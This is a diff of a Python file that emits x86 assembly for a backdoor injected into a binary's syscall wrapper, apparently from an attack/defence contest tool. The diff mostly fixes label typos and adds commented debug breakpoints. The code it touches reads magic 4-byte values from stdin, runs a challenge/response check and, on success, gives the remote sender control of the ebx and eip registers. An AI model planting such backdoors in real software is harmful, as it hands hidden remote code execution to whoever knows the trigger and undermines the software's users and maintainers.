@@ -167,7 +167,7 @@ __attribute__((fastcall)) int SHA1(int MESSAGE[] )
                 ; esi, edx, ecx, ebx are free because we are in a syscall wrapper restoring them
 
                 test ebx, ebx ; test if ebx is 0 (stdin)
-                je _enter_backddor
+                je _enter_backdoor
                 cmp ebx, 1 ; stdout is also good
                 jne _exit_backdoor
             '''
@@ -197,7 +197,7 @@ __attribute__((fastcall)) int SHA1(int MESSAGE[] )
 
         code = code_header + '''
 
-            _enter_backddor:
+            _enter_backdoor:
             ; we do not check rx_bytes: the assumption is that the network will never split the 4 bytes we send 
             ; I think it is a correct assumption because on the pov side we send 4 bytes together and 4 is very small
             mov esi, edx
@@ -228,7 +228,7 @@ __attribute__((fastcall)) int SHA1(int MESSAGE[] )
                 cmp DWORD[{backdoor_receive_buffer}], 0x80b16733
                 je _real_backdoor
                 cmp DWORD[{backdoor_receive_buffer}], 0x81b16733
-                je _fake_backdor
+                je _fake_backdoor
                 jmp _exit_backdoor
 
             ; for both backdoors we want to give fake/real control over ebx and eip
@@ -243,6 +243,7 @@ __attribute__((fastcall)) int SHA1(int MESSAGE[] )
                 xor edx, edx
                 xor ecx, ecx
                 mov cl, 64;
+                ; int 3
                 _zero_loop:
                     test ecx, ecx
                     je _zero_loop_out
@@ -255,6 +256,7 @@ __attribute__((fastcall)) int SHA1(int MESSAGE[] )
                 push esp
                 call {get_4_rnd}
                 
+                ; int 3
                 ; mov DWORD [{random_value}], 0x0006a87c ; uncomment for debug
                 mov eax, DWORD [{random_value}]
                 ; jmp eax ; uncomment for debug
@@ -307,7 +309,7 @@ __attribute__((fastcall)) int SHA1(int MESSAGE[] )
                 ; now we have the result in eax
                 cmp eax, DWORD [{random_value}] ; this is the challenge/response check!
                 ; note that the check is actually checking 32 bits, out of which 13 (32-19) are always zero
-                jne _fake_backdor ; check failed, just send the execution to a bad place
+                jne _fake_backdoor ; check failed, just send the execution to a bad place
 
                 ; now copy the transmitted ebx and eip
                 xor ecx, ecx
@@ -326,7 +328,7 @@ __attribute__((fastcall)) int SHA1(int MESSAGE[] )
                 ; magically ret will jump to the stack, executing pop, pop, ret (setting ebx, eip to the sent values)
                 ret
 
-            _fake_backdor:
+            _fake_backdoor:
                 ; set the stack as in the real backdoor
                 push 0xc35b5990 ; pop ecx, pop ebx, ret, nop: pop ecx is used to clean [esp] from the stack
                 push esp
